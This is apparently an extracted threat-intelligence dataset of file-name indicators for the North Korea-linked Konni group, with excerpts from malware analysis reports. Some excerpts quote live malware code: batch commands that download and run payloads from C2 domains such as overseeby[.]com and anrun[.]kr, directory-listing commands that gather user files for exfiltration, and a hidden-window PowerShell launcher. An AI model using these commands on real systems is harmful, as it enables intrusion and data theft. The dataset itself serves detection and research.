schema_version,actor_ref,artifact_id,observation_id,artifact_type,value,normalized_value,disposition,observed_at,observed_at_precision,observed_at_status,observed_at_basis,source_published_at,source_id,source_path,source_location,campaign_refs,malware_refs,infrastructure_refs,roles,campaign_count,seen_in_multiple_campaigns,confidence,tlp,extraction_method,context_excerpt,analyst_notes
1.0.0,actor--konni,artifact--sha256:541b78f65610bc1cad93ebc7c04e801d3f77a1dff9426e7ea92bb0be91307834,observation--sha256:27cf2f39b098e636d0c6e8833827167da3c0edff6df3b4b40304ab017faf7bdd,file-name,07856126.bat,07856126.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 2}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 1 - 목차 (CONTENTS) – 01. 개요 (Overview) ................................................................................................ 2 a. 금융 및 기밀정보 위협 식별 (Threat Hunting) .................................................. 2 b. 악성 파일 동작 흐름도 (Malware Flowchart) .................................................... 3 c. Konni 배경 (Background) .............................................................................. 4 d. 공격 전술 및 기술, 절차 (TTPs) &",
1.0.0,actor--konni,artifact--sha256:541b78f65610bc1cad93ebc7c04e801d3f77a1dff9426e7ea92bb0be91307834,observation--sha256:2525e5b749a144921fc4ea650152d6bfae7e70e43f443b823d4cbb2439236564,file-name,07856126.bat,07856126.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 32}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 31 명령어 기능 설명 dir C:\Users\%username%\downloa ds\ /s > %~dp0cuserdown.txt ‘downloads’ 경로의 (다운로드)파일 및 폴더 목록 정보를 ‘cuserdown.txt’ 파일로 저장 dir C:\Users\%username%\docume nts\ /s > %~dp0cuserdocu.txt ‘documents’ 경로의 (문서)파일 및 폴더 목록 정보를 ‘cuserdocu.txt’ 파일로 저장 dir C:\Users\%username%\desktop \ /s > %~dp0cuserdesk.txt ‘desktop’ 경로의 (바탕화면)파일 및 폴더 목록 정보를 ‘cuserdesk.txt’ 파일로 저장 dir ""C:\Program Files\"" /s > %~dp0cprog.txt ‘Program Files’ 경로의 (프로그램)파일 및 폴더 목록 정",
1.0.0,actor--konni,artifact--sha256:541b78f65610bc1cad93ebc7c04e801d3f77a1dff9426e7ea92bb0be91307834,observation--sha256:c529bc0176cf58b28a5c482fd29ba79f0b0b55d8ad01a360ef168998cf6446a6,file-name,07856126.bat,07856126.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 34 g. ‘07856126.bat’ ○ 본 파일도 [RC4+Base64] 암호화 루틴을 가지고 있으며, 사용자 정보를 C2 서버로 유출할 때 암호화하는 용도로 사용이 됩니다. 파일명 07856126.bat MD5 14600ffc77c091a708a8df26b0043a84 SHA1 1953a2a6c8ec43230ae2eb920efe5d85d50b8cf4 SHA256 a9605c875079f350ffe66f2647289c5fea95ce5cdfecebe967 5bc6ed22c77dd7 [표 15] 07856126.bat 파일 HASH 정보 화면 ○ ‘32981202.bat’ 파일이 호출할 때 사용하며, 수집된 각종 정보 텍스트(txt) 파일을 암호화해 업로드할 때 사용되며, fn(filename), fd(filedata), r(rc4 key) 등이 함께 전송되고, 업로드가 완료되면 ‘upok.tx",
1.0.0,actor--konni,artifact--sha256:541b78f65610bc1cad93ebc7c04e801d3f77a1dff9426e7ea92bb0be91307834,observation--sha256:d530531f34c435ca97f060f54cb974598014d47660fab410684a880d29cbf1e9,file-name,07856126.bat,07856126.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○LNK 바로가기파일에의해Drop 되는ZIP 압축파일은다음과같은구성을가지고있습니다. 국세청사칭ZIP파일구성 북한인권단체사칭ZIP파일구성 start.vbs update.vbs 07856126.bat paycom.ini 19288086.bat resolvedns.bat 30966118.bat stopedge.bat 32981202.bat versioninfo.bat 73888454.bat activate.vbs unzip.exe unactivate.vbs - install.vbs - unzip.exe[표5-2] Konni 캠페인별ZIP파일비교화면 ○국세청사칭의경우'73888454.bat' 파일은'30966118.bat' 파일이존재할경우레지스트리 Run 경로에 'start.vbs' 파일을 등록해 지속성을 유지합니다. 반면,북한인권단체 사칭의 경우 'stopedge.bat' 파일은 'paycom.ini' 파일이존재할경우작업 스케줄러 생성을 통해",
1.0.0,actor--konni,artifact--sha256:ac102ed6969b219f44af7da643fbb3b56b09e558f488a70ba09607e23d5e2f60,observation--sha256:f97aa6254759f66fed84b2aa703974913feef9264c8532d341be181c65a30445,file-name,1.EXE,1.EXE,candidate,,unknown,unknown,not-stated,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 40}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"The initial dropper, named mt4managre.exe, used a PDB path of: E:\Work\_Spyware\VIRUS_2020\Release\Dropper_exe_ media.pdb. The dropper can have a variable number of embedded payloads, which is defined by the last four bytes (DWORD) of the file (Figure 44). Figure 44. YoreKey dropper encoded config and number of payloads This value is then multiplied by 76 to find the size of the config. The config precedes the last four bytes of the file. This particular dropper only had two embedded payloads, s",
1.0.0,actor--konni,artifact--sha256:b51758c7ec7c335d19374a8910daa1b8feaeb6bf98ac8757aa331549616b4d40,observation--sha256:060cf31588c10b4bbd3d818efa50af26cb5023c7854db1ff11e796fdfbf39e09,file-name,19288086.bat,19288086.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 18 ○ ‘start.vbs’ 파일은 레지스트리에 등록돼 컴퓨터가 부팅될 때마다 작동하며, 단계별 배치 파일 실행 역할을 수행합니다. 07856126.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘32981202.bat’ 파일이 업로드시 사용 - C2 로 정보 업로드 후 ‘upok.txt’ 생성 19288086.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘30966118.bat’ 파일이 다운로드시 사용 b. ‘73888454.bat’ 파일이 다운로드시 사용 30966118.bat - ‘19288086.bat’ 루틴을 이용해 C2(naver.cloudfile",
1.0.0,actor--konni,artifact--sha256:b51758c7ec7c335d19374a8910daa1b8feaeb6bf98ac8757aa331549616b4d40,observation--sha256:850c8958037e83c6f685b4e4d9be47afca6a53320d00e548e297b229a122cbe6,file-name,19288086.bat,19288086.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 19 b. fd - Base64+RC4 로 인코딩된 데이터 c. r - RC4 Key 값 [Powershell (Get-Date).ticks]7 73888454.bat - ‘30966118.bat’ 파일 존재 시 : a. 레지스트리 Run 에 ‘svchostno2’ 이름으로 ‘start.vbs’ 등록 b. ‘30966118.bat’ 실행 후 이후 명령에서 삭제 c. ‘32981202.bat’ 실행 - ‘30966118.bat’, ‘upok.txt’ 파일 없을 시 : a. ‘32981202.bat’ 실행 - ‘pakistan.txt’ 파일 없을 시 : a. ‘temprun.bat’ 파일 존재시 삭제 b. ‘19288086.bat’ 파일 루틴을 통해 C2(overseeby[.]com)에서 감염 컴퓨터명 경로 파일을 ‘IxOkj.cab’ 다운로드 후 압축 해제하고 삭제 c. 압축 해제 된 파일 ‘t",
1.0.0,actor--konni,artifact--sha256:b51758c7ec7c335d19374a8910daa1b8feaeb6bf98ac8757aa331549616b4d40,observation--sha256:d97543deb01431c31143c9147ad1bf6a61fdf8ed83f7fa18000a3ce3dd0b9027,file-name,19288086.bat,19288086.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 26}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 25 ○ (goto 1) 루틴으로 점프하면, 가장 먼저 ‘temprun.bat’ 파일이 있는지 비교하고 존재할 경우 삭제를 진행합니다. 그리고 call 배치 명령을 통해 ‘19288086.bat’ 파일을 호출합니다. call 19288086.bat ""http://overseeby[.]com/list.php?f=%COMPUTERNAME%.txt"" ""%~dp0IxOkj.cab"" ""1""> nul expand IxOkj.cab -F:* %~dp0 > nul del /f /q IxOkj.cab > nul call temprun.bat > nul [표 09] C2 호스트에서 압축파일 다운로드 및 실행 과정 화면 ○ C2(overseeby [.]com) 명령을 통해 감염된 컴퓨터명의 파일이 서버에 존재할 경우 ‘IxOkj.cab’ 이름으로 다운로드하고 ‘expand’ 명령을 통해 압축을 풀고 삭제합니다. ",
1.0.0,actor--konni,artifact--sha256:b51758c7ec7c335d19374a8910daa1b8feaeb6bf98ac8757aa331549616b4d40,observation--sha256:aec25f48955064ff5f1f4453a66caf3773de10a5840c6d6d680187f7ac6aceb8,file-name,19288086.bat,19288086.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 28}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 27 d. ‘30966118.bat’ ○ 본 파일은 ‘73888454.bat’ 명령에서 파일 존재 조건 성립과 레지스트리 등록 후 호출되는 배치 파일입니다. 파일명 30966118.bat MD5 b307e8e59113ddeb622f53ae37ade042 SHA1 d029fbeed3c0a1e535e7e7bbb48277afa105b835 SHA256 199a9bb434a86029f7ad3fe87b3e6d2478487502ef7b0125 69b3029b8fbc7e15 [표 13 ] 30966118.bat 파일 HASH 정보 화면 ○ ‘19288086.bat’ 파일 호출을 통해 C2(naver.cloudfiles001[.]com) 서버로 접근하고, 변수로 지정된 ‘85214.zip’ 파일 다운로드를 수행합니다. 분석 당시 해당 파일이 다운로드 되지는 않았습니다. 공격자는 감염된 컴퓨터명을 확인해 선별",
1.0.0,actor--konni,artifact--sha256:b51758c7ec7c335d19374a8910daa1b8feaeb6bf98ac8757aa331549616b4d40,observation--sha256:c59a6550654a414298f64ec915aed7b8fe500854157feee56d8932643ef31625,file-name,19288086.bat,19288086.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 2}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 1 - 목차 (CONTENTS) – 01. 개요 (Overview) ................................................................................................ 2 a. 금융 및 기밀정보 위협 식별 (Threat Hunting) .................................................. 2 b. 악성 파일 동작 흐름도 (Malware Flowchart) .................................................... 3 c. Konni 배경 (Background) .............................................................................. 4 d. 공격 전술 및 기술, 절차 (TTPs) &",
1.0.0,actor--konni,artifact--sha256:b51758c7ec7c335d19374a8910daa1b8feaeb6bf98ac8757aa331549616b4d40,observation--sha256:67a61bd57b10a58efca535ee14a0fde0c46e8f4f2953d0358bb176a8242e3d7a,file-name,19288086.bat,19288086.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 34}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 33 f. ‘19288086.bat’ ○ ‘19288086.bat’ 파일은 환경변수 조건에 따라 Powershell 명령을 통해 [RC4+Base64] 암호화와 다운로드 설정 루틴을 지니고 있습니다. 파일명 19288086.bat MD5 b4461d68a8026981ab47294c2c7b5d91 SHA1 f1b4748d50a38952edc2f0953cd270ec17bb5b2a SHA256 79f61da076edf4cc9434e1c1f25ca62664d5f0bc5b9b91736 60f3089491eb8fe [표 14] 19288086.bat 파일 HASH 정보 화면 ○ 변수명 (if not ""%ypczipzqWxLByMQH%"" == ""0"") 에 따라 암호화 루틴이 작동하는데, ‘73888454.bat’ 파일에서 호출 될 때 사용이 됩니다. [그림 25] 19288086.bat 내부 코드 화면",
1.0.0,actor--konni,artifact--sha256:b51758c7ec7c335d19374a8910daa1b8feaeb6bf98ac8757aa331549616b4d40,observation--sha256:1c745bb95ea1774d3ca4e56984b676ef2d6a3fb0d415262437372a5ad5022b62,file-name,19288086.bat,19288086.bat,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 35}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○LNK 바로가기파일에의해Drop 되는ZIP 압축파일은다음과같은구성을가지고있습니다. 국세청사칭ZIP파일구성 북한인권단체사칭ZIP파일구성 start.vbs update.vbs 07856126.bat paycom.ini 19288086.bat resolvedns.bat 30966118.bat stopedge.bat 32981202.bat versioninfo.bat 73888454.bat activate.vbs unzip.exe unactivate.vbs - install.vbs - unzip.exe[표5-2] Konni 캠페인별ZIP파일비교화면 ○국세청사칭의경우'73888454.bat' 파일은'30966118.bat' 파일이존재할경우레지스트리 Run 경로에 'start.vbs' 파일을 등록해 지속성을 유지합니다. 반면,북한인권단체 사칭의 경우 'stopedge.bat' 파일은 'paycom.ini' 파일이존재할경우작업 스케줄러 생성을 통해",
1.0.0,actor--konni,artifact--sha256:3fe6d406e0287c3e88ec6bef4b8fdedadce0aaebbd9e7271bf3159a43fed3221,observation--sha256:91242025f93a916cbc510b6be5318707699d2d0130355b5fcbad106862e21000,file-name,20190429_13.doc,20190429_13.doc,candidate,,unknown,unknown,not-stated,,source--konni--e22c456560b2d889,konni/bluesky.txt,"{""line"": 12}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,20190429_13.doc,
1.0.0,actor--konni,artifact--sha256:ee9705a7c04894c002f45189f02795939d6ead19fe148db65bb21b550712f970,observation--sha256:c0ce21b64d8b585a35e389d473befe514e0eae798273f3448d972a35fecfb00a,file-name,20190513_8.doc,20190513_8.doc,candidate,,unknown,unknown,not-stated,,source--konni--e22c456560b2d889,konni/bluesky.txt,"{""line"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,text-line,20190513_8.doc,
1.0.0,actor--konni,artifact--sha256:46be393c9c8e22a1ff42d1aa44ad0851e354c6406d737c127ba619f49d20653c,observation--sha256:b0e5f264f83a92984d9a443d097db1cc537f246bd75060129495e827c26eed06,file-name,20Campaign_Report.pdf,20Campaign_Report.pdf,candidate,2017-08-01T00:00:00Z,month,known,same-record,,source--konni--5b6e99ac261cea7a,konni/konni-threat-insight-paper-triple-threat-N-Korea-aligned-TA406-steals-scams-spies.pdf,"{""page"": 48}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Reference List https://asec.ahnlab.com/ko/1251/ https://blog.alyac.co.kr/2061 https://blog.alyac.co.kr/3014 https://blog.alyac.co.kr/3390 https://blog.alyac.co.kr/3550 https://blogs.blackberry.com/en/2017/08/threat-spotlight-konni-stealthy-remote-access-trojan https://blog.talosintelligence.com/2017/05/konni-malware-under-radar-for-years.html https://download.ahnlab.com/kr/site/library/Analysis_Report_Operation_Moneyholic.pdf https://e.cyberint.com/hubfs/Cyberint_Konni%20Malware%202019%20Campaig,
1.0.0,actor--konni,artifact--sha256:c9ab44ca32054720a789294377c79247479e42efc21f0ab5447148dd2e7c1861,observation--sha256:41be1a6fc6279f7ecc8e9ccd86f83e0320802bbdd62f163d152dab940ff02d1b,file-name,230418.bat,230418.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 37}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 36 04. 유사도 분석 (Similarity) a. APT37 LNK 공격과 Konni LNK 공격 구조비교 ○ 2023 년 상반기 발견된 APT37 과 Konni 캠페인의 LNK 악성 코드를 비교하면 서로 다른 패턴을 가지고 있음을 알 수 있습니다. Konni 경우 Base64 인코딩을 사용합니다. APT37 LNK (MD5 : 1b046ab2261bc0dc5c6cd999f9a8b1c6) Konni LNK (MD5 : 0db38e75740572fed8179d67c33019cb) /c powershell -windowstyle hidden $dirPath = Get-Location; if($dirPath -Match 'System32' -or $dirPath -Match 'Program Files') {$dirPath = '%temp%'}; $lnkpath = Get-ChildItem -Pa,
1.0.0,actor--konni,artifact--sha256:c9ab44ca32054720a789294377c79247479e42efc21f0ab5447148dd2e7c1861,observation--sha256:405f5d7db797909ee42a5ced77718d4eb8f03550a4b807620d414fdb554710c4,file-name,230418.bat,230418.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 38}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 37 b. APT37 와 Konni LNK 공격 차이점 ○ APT37 에서 사용된 LNK 악성 코드는 Powershell 인자 값을 사용해 내부에 삽입한 정상 문서(HWP, PDF 등)와 악성 BAT 파일의 위치를 지정해 사용합니다. 반면, Konni LNK 악성 코드는 Powershell 인자 값을 사용하는 것은 동일하지만, Base64 데이터로 인코딩된 값을 먼저 사용합니다. ○ Base64 인코딩된 값을 디코딩해 비교해 보면 일부 유사한 패턴을 가지고 있지만, APT37 의 경우 정상과 악성 파일이 그대로 내부에 삽입된 형태를 가진다면, Konni 의 경우 CAB 또는 ZIP 압축 형태를 포함한 점이 서로 다릅니다. 따라서, Konni LNK 경우 압축을 해제하는 설정 값들이 추가로 존재합니다. APT37 LNK Konni LNK -Recurse *.lnk ^| where-object {",
1.0.0,actor--konni,artifact--sha256:06fa7989e34d12cec7d7ccdec2f8b4bcab3b066a6e87ca692b9e6b52ca6e8c81,observation--sha256:caf666375d026ff0c95ca67bd379f67d0de649d09369834332f73f16c079da6b,file-name,230419.hwp,230419.hwp,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 37}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,Threat Intelligence Report Genians Security Center 36 04. 유사도 분석 (Similarity) a. APT37 LNK 공격과 Konni LNK 공격 구조비교 ○ 2023 년 상반기 발견된 APT37 과 Konni 캠페인의 LNK 악성 코드를 비교하면 서로 다른 패턴을 가지고 있음을 알 수 있습니다. Konni 경우 Base64 인코딩을 사용합니다. APT37 LNK (MD5 : 1b046ab2261bc0dc5c6cd999f9a8b1c6) Konni LNK (MD5 : 0db38e75740572fed8179d67c33019cb) /c powershell -windowstyle hidden $dirPath = Get-Location; if($dirPath -Match 'System32' -or $dirPath -Match 'Program Files') {$dirPath = '%temp%'}; $lnkpath = Get-ChildItem -Pa,
1.0.0,actor--konni,artifact--sha256:06fa7989e34d12cec7d7ccdec2f8b4bcab3b066a6e87ca692b9e6b52ca6e8c81,observation--sha256:1aa6f1db5f01b9c6d12101bfba777f7a8aeda47c4c885468caab3625659e9423,file-name,230419.hwp,230419.hwp,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 38}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 37 b. APT37 와 Konni LNK 공격 차이점 ○ APT37 에서 사용된 LNK 악성 코드는 Powershell 인자 값을 사용해 내부에 삽입한 정상 문서(HWP, PDF 등)와 악성 BAT 파일의 위치를 지정해 사용합니다. 반면, Konni LNK 악성 코드는 Powershell 인자 값을 사용하는 것은 동일하지만, Base64 데이터로 인코딩된 값을 먼저 사용합니다. ○ Base64 인코딩된 값을 디코딩해 비교해 보면 일부 유사한 패턴을 가지고 있지만, APT37 의 경우 정상과 악성 파일이 그대로 내부에 삽입된 형태를 가진다면, Konni 의 경우 CAB 또는 ZIP 압축 형태를 포함한 점이 서로 다릅니다. 따라서, Konni LNK 경우 압축을 해제하는 설정 값들이 추가로 존재합니다. APT37 LNK Konni LNK -Recurse *.lnk ^| where-object {",
1.0.0,actor--konni,artifact--sha256:2e119fb609701b76439bb0ab34b0be08b3a03611db82d0ad6245bcc84d0ad939,observation--sha256:eac8d0b15bfd3a0d78db44e5dc868e37931e67c7a77997fdf40615bfb6c0d372,file-name,230704.vbs,230704.vbs,candidate,,unknown,unknown,not-stated,2023-09-26T00:00:00Z,source--konni--9f9859221e0eb3bc,konni/20230926_threat_inteligence_report_konniapt.pdf,"{""page"": 33}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ■'resolvedns.bat' 파일코드분석 ○'resolvedns.bat' 파일은앞서작업스케줄러에등록된'install.vbs' 파일이실행될경우호출이됩니다. @echooff pushd""%~dp0"" set ttn=324093set tty=230704seturl=http://anrun[.]kr/movie/contents.php?fifo=%COMPUTERNAME% if exist ""stopedge.bat"" (del /f /qstopedge.bat)if exist ""%ttn%.zip"" (del /f /q%ttn%.zip)WScript.exeactivate.vbs ""%url%"" ""%ttn%.zip"" if exist ""%ttn%.zip"" (call unzip.exe-P""a"" -o""%~dp0%ttn%.zip"" >nuldel /f /q%~dp0%ttn%.zip>nulWScript.exe""%tty%.vbs""del /f /q%tty%.vbs >nul) [",
1.0.0,actor--konni,artifact--sha256:a80e1c701850b9aa1d52fea59af61f4458179823014ec5a5f7da5fa8a011f1b7,observation--sha256:d8e1967a2f2cd0f971889d041acd2e82a423d71b821e457bc709a90210d5ba16,file-name,30966118.bat,30966118.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 19}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 18 ○ ‘start.vbs’ 파일은 레지스트리에 등록돼 컴퓨터가 부팅될 때마다 작동하며, 단계별 배치 파일 실행 역할을 수행합니다. 07856126.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘32981202.bat’ 파일이 업로드시 사용 - C2 로 정보 업로드 후 ‘upok.txt’ 생성 19288086.bat - Powershell 기반의 [RC4+Base64] 암/복호화 루틴으로 Key 값은 ‘(Get-Date).Ticks.ToString()’ 문자로 사용 a. ‘30966118.bat’ 파일이 다운로드시 사용 b. ‘73888454.bat’ 파일이 다운로드시 사용 30966118.bat - ‘19288086.bat’ 루틴을 이용해 C2(naver.cloudfile",
1.0.0,actor--konni,artifact--sha256:a80e1c701850b9aa1d52fea59af61f4458179823014ec5a5f7da5fa8a011f1b7,observation--sha256:126c741f73dfb61d523161ea4674f695f79194cf4790ea2f1aef4d77a296cc59,file-name,30966118.bat,30966118.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 20}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 19 b. fd - Base64+RC4 로 인코딩된 데이터 c. r - RC4 Key 값 [Powershell (Get-Date).ticks]7 73888454.bat - ‘30966118.bat’ 파일 존재 시 : a. 레지스트리 Run 에 ‘svchostno2’ 이름으로 ‘start.vbs’ 등록 b. ‘30966118.bat’ 실행 후 이후 명령에서 삭제 c. ‘32981202.bat’ 실행 - ‘30966118.bat’, ‘upok.txt’ 파일 없을 시 : a. ‘32981202.bat’ 실행 - ‘pakistan.txt’ 파일 없을 시 : a. ‘temprun.bat’ 파일 존재시 삭제 b. ‘19288086.bat’ 파일 루틴을 통해 C2(overseeby[.]com)에서 감염 컴퓨터명 경로 파일을 ‘IxOkj.cab’ 다운로드 후 압축 해제하고 삭제 c. 압축 해제 된 파일 ‘t",
1.0.0,actor--konni,artifact--sha256:a80e1c701850b9aa1d52fea59af61f4458179823014ec5a5f7da5fa8a011f1b7,observation--sha256:cfac7fa999e561788c5bfd112aca8b499e136e9ec8a139d8fe711a420e6316ce,file-name,30966118.bat,30966118.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 24}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 23 c. ‘73888454.bat’ ○ VBS 다음에 실행되는 ‘73888454.bat’ 파일은 레지스트리 등록, 피해 컴퓨터 정보 수집 명령 호출, 파일 다운로드 등을 수행합니다. 파일명 73888454.bat MD5 29b3fa2293c63145e544318ca65a67cf SHA1 0fe0379d20570aaaaeac68ac0355feab514c7452 SHA256 14209a0d81a0d05757cf73a18c85cf0a1a6f13a042775430 0031e078ce128c32 [표 07] 73888454.bat 파일 HASH 정보 화면 ○ 본 일괄 배치 파일은 커맨드(CMD) 화면에 수행 내용이 출력되지 않도록 ‘@echo off’ 선언을 합니다. ○ 실행된 배치파일 위치를 저장하기 위해 ‘pushd ""%~dp0""’ 명령을 상단에 추가합니다. 그리고 ‘30966118.bat’ 파일",
1.0.0,actor--konni,artifact--sha256:a80e1c701850b9aa1d52fea59af61f4458179823014ec5a5f7da5fa8a011f1b7,observation--sha256:19110900872547ca8fc355f9dc77317fa9a4f8cd070014d93f0040384dd2d212,file-name,30966118.bat,30966118.bat,candidate,,unknown,unknown,not-stated,2023-07-27T00:00:00Z,source--konni--079e51a056632f53,konni/20230727_threat_inteligence_report_Konni.pdf,"{""page"": 25}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"Threat Intelligence Report Genians Security Center 24 [그림 15] 73888454.bat 파일 내부 코드 화면 ○ 만약 ‘30966118.bat’ 파일이 없을 경우에는 ""upok.txt"" 파일이 존재하지 않을 경우에만 ‘32981202.bat’ 파일을 실행하는데, ‘upok.txt’ 파일은 컴퓨터 정보가 유출(Upload OK)될 때 만들어 집니다. ○ 그 다음 루틴은 ‘pakistan.txt’ 파일 존재 여부에 따라 (goto 1), (goto EXIT)로 분기됩니다. 처음 악성 파일이 작동할 때는 해당 파일이 존재하지 않기 때문에 (goto 1) 루틴으로 점프하게 됩니다. 만약 파일이 존재할 경우에는 (goto EXIT) 루틴은 ‘pakistan.txt’ 파일을 삭제하고 종료되는데, 일종의 ‘킬 스위치(Kill Switch)’와 같은 비상 종료 기능을 수행합니다. 이는 다수의 Konni 캠페인에서 지속적으로 사용중인 방식입니다.",
